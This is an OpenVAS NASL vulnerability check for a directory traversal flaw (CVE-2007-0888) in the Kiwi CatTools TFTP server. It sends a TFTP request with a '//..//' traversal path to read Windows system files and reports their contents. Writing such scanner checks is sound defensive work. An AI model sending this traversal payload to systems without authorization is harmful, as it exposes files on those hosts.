###############################################################################
# OpenVAS Vulnerability Test
# $Id: kiwi_cattools_dir_traversal.nasl 13155 2019-01-18 15:41:35Z cfischer $
#
# Kiwi CatTools < 3.2.9 Directory Traversal
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200001");
  script_version("$Revision: 13155 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 16:41:35 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2007-0888");
  script_bugtraq_id(22490);
  script_name("Kiwi CatTools < 3.2.9 Directory Traversal");
  script_category(ACT_ATTACK);
  script_family("Remote file access");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");
  script_exclude_keys("tftp/backdoor", "keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.kiwisyslog.com/kb/idx/5/178/article/");
  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=117097429127488&w=2");

  script_tag(name:"solution", value:"Upgrade to Kiwi CatTools version 3.2.9 or later.");

  script_tag(name:"summary", value:"The remote tftpd server is affected by a directory traversal vulnerability.");

  script_tag(name:"insight", value:"Kiwi CatTools is installed on the remote host. The version installed is vulnerable
  to a directory traversal attack by using '[char]//..' sequences in the path.");

  script_tag(name:"impact", value:"A attacker may be able to read and write files outside the tftp root.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("tftp.inc");

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

if(get_kb_item("tftp/" + port + "/backdoor"))
  exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  get = tftp_get(port:port, path:"z//..//..//..//..//..//" + files[file]);
  if(!get)
    continue;

  if(egrep(pattern:file, string:get, icase:TRUE)) {
    report = string("The " + files[file] + " file contains:\n", get);
    security_message(port:port, data:report, proto:"udp");
    exit(0);
  }
}

exit(99);